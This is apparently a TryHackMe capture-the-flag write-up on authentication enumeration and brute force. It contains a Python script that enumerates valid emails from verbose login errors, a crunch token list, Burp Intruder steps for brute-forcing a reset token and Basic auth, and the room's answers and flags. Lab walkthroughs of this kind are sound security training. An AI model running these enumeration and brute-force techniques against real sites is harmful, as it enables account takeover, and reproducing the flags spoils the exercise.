# Enumeration & Brute Force

![image](https://github.com/user-attachments/assets/a9f303e9-3636-4cd1-8d78-2baf824c04e4)

## Objectives
By the end of this room, you will:
- Understand the significance of enumeration and how it sets the stage for effective brute-force attacks.
- Learn advanced enumeration methods, mainly focusing on extracting information from verbose error messages.
- Comprehend the relationship between enumeration and brute-force attacks in compromising authentication mechanisms.
- Gain practical experience using tools and techniques for both enumeration and brute-force attacks.

**URL:** https://tryhackme.com/r/room/enumerationbruteforce

## Authentication Enumeration
In order to perform the brute force attacks, we must first figure out the authentication mechanism. The goal is to learn how everything is conncected, providing a blueprint for potential attacks.
  1. We must identify valid usernames or emails
  2. Identify passwords policies
These are the two main things we need to focus for the enumeration processes.
THere are several places to look for:

**Registration page**
- This is where we can enumerate both usernames and passwords policies. If a username has already existed, the application will prevent us from registering a new user using that same username.
- Similarly, we can find out password policies by trying different combinations. The errors displayed by the applications provide us with the password policies

**Password reset features**
- Password reset mechanisms are implemented differently on various applications. Some unintentional behavior / misconfiguration may provide sensitive information. For example, like registration page, when trying to reset password for a non-existing user, the application may display an error stating the user does not exist. We can leverage this message to exploit usernames (as existing users won't display these kinds of messages).

**Verbose error**
- These are errors messages displayed when users interact with the applications. "Users not found", "invalid token", "incorrect passwords" are amongst the most commonly used, which allows attackers to gain more information about the authentication process.

To enumerate the email:
1. Create a Python script `script.py`

```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```

2. Download the email list from this [repository](https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt)
3. Run the script against the downloaded text file in step 2
```bash
python3 script.py usernames_gmail.com.txt
```
And we found the email.

**- What type of error messages can unintentionally provide attackers with confirmation of valid usernames?**

`-> Verbose error`

**- What is the valid email address from the list?**

`-> canderson@gmail.com`

## Exploit vulnerability password reset logic
- Go to `http://enum.thm/labs/predictable_tokens/forgot.php` and submit a password reset for `admin@admin.com`
- Create an `otp.txt` file to bruteforce the token
```bash
crunch 3 3 -t %%% -s 100 -e 200 -o otp.txt
```
- Make a GET request to `http://enum.thm/labs/predictable_tokens/reset_password.php?token=123` and intercept the request using BurpSuite and send it to Intruder
- In Burp Suite, set the position `123` to be brute-forced
  
![image](https://github.com/user-attachments/assets/4b5e054d-d61c-4cbe-b5e6-c77793d2d68d)

- In the **Payloads** tab, load the `otp.txt` created in the previous step

  ![image](https://github.com/user-attachments/assets/e227b679-6b35-4458-b1ca-964f1315134e)

- In the **Settings** tab, add "Ivalid token" error message to filter the request that doesn't contain that message. This helps use quickly identify the valid token

![image](https://github.com/user-attachments/assets/3013ba97-9f22-4cfd-8fd6-2026c616a7d0)

- Once the valid token is found, view the Response body, which provides the new password for `admin@admin.com`. Use it to log in and retrieve the flag.

**- What is the flag?**

`-> THM{50_pr3d1ct4BL333!!}`

## Exploit Basic HTTP Authentication
- Go to the `http://enum.thm/labs/basic_auth`
- Attempt to login with credentials `admin:password`
- Intercept the traffic in Burp Suite
- In the `Authorization` field, highlight the value next to "Basic"
  
  ![image](https://github.com/user-attachments/assets/23d443e4-ee36-4b3e-b2bc-107d9c9a849b)

- Notice that on the right side under the **Inspector** panel, the text is decoded from Base64, which results from the login credentials.
- Send the request to Intruder to bruteforce
- Highlight the encoded text we just inspected so it can be brute-forced

![image](https://github.com/user-attachments/assets/52bf6e33-783f-4b0c-a2a9-fa9099f07d11)

- In the **Payloads** tab, load the password text from `/usr/share/SecLists/Passwords/Common-Credentials/500-top-worst-passwords.txt`

![image](https://github.com/user-attachments/assets/8ff67250-1626-4e4f-b5c1-a244036dee56)

- Scroll down to the **Payload Processing** section, add a rule. The first rule we add is `**Add prefix**` with value `admin:`

![image](https://github.com/user-attachments/assets/5f84b029-efb9-4914-998c-afb604428226)

- Add the second rule to Base64 encode the whole payload. The final result of the  **Payload Process** should look like this:

![image](https://github.com/user-attachments/assets/637898fc-a2d6-450d-b8e0-82a1f6de3b55)

- Start the attack, and we should get a valid payload to login for `admin`. Decode it and we should get the password.

**- What is the flag?**

`-> THM{b4$$1C_AuTTHHH}`
